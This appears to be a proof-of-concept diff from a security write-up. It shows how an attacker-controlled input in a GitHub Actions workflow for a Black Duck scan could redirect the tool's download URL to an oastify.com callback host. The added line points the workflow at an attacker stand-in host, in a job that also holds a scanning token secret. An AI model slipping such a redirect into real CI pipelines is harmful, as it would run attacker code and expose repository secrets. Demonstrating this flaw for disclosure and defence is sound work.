@@ -19,4 +19,4 @@ jobs:
           blackducksca_url: ${{ vars.BLACKDUCKSCA_URL }}
           blackducksca_token: ${{ secrets.BLACKDUCKSCA_TOKEN }}
           # The "exploit": Attacker PR controls this input via a file they modified
-          bridgecli_download_url: ${{ some_attacker_controlled_value }}
+          bridgecli_download_url: ${{ http://m4r9cgpugdyzpp4sathny1g1eskk8awz.oastify.com }}
